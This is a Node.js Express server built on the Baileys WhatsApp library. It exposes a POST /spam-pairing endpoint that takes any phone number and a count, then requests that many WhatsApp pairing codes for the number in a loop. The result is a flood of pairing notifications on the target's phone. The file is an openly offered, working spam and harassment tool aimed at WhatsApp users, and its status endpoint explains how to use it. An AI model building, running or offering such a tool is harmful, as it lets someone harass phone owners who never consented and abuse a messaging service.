const express = require('express');
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const xColor = '\x1b[0m';

async function KleeProject(phoneNumber, KleeCodes) {
    const { state } = await useMultiFileAuthState('./69/session');
    const KleeBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        for (let i = 0; i < KleeCodes; i++) {
            try {
                let code = await KleeBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(color + `Success Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
        console.error('Error in KleeProject:', error);
    }

    return KleeBotInc;
}

// Endpoint untuk metode POST
app.post('/spam-pairing', async (req, res) => {
    const { phoneNumber, totalSpam } = req.body;

    if (!phoneNumber || !totalSpam || isNaN(totalSpam) || totalSpam <= 0) {
        return res.status(400).json({ message: 'Invalid input. Please provide a valid phone number and total spam count.' });
    }

    try {
        const KleeCodes = parseInt(totalSpam);
        await KleeProject(phoneNumber, KleeCodes);
        res.status(200).json({ message: 'Spam pairing process started.' });
    } catch (error) {
        res.status(500).json({ message: 'An error occurred while processing your request.', error: error.message });
    }
});

// Endpoint untuk metode GET
app.get('/status', (req, res) => {
    res.status(200).json({
        message: "Server is running",
        instructions: [
            "Use POST /spam-pairing to start the spam pairing process.",
            "Provide JSON body with 'phoneNumber' and 'totalSpam'."
        ]
    });
});

app.listen(PORT, () => {
    console.log(color + `Server running on port ${PORT}` + xColor);
});